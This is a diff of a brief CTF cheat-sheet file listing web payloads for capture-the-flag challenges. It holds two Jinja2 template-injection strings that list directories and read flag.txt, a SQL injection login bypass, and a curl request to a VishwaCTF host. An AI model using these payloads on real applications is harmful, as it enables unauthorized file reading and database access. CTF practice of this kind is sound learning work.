@@ -1,14 +1,19 @@
+### Useful things to try in web ctf challenges
+
+```py
 submit?name={{request.application.__globals__.__builtins__.__import__(%27os%27).listdir()}}
-
 to check the flag file location
+```
 
+```py
 submit?name={{%27abc%27.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0](%27flag.txt%27).read()}}
-
 to read the vulnerability
+```
 
-
+```python
 SQL INJECTION
 'OR'1'='1
+```
 
 get the flag
 $ curl -I https://r3qu35t-m3-fl4g.vishwactf.com -X FLAG
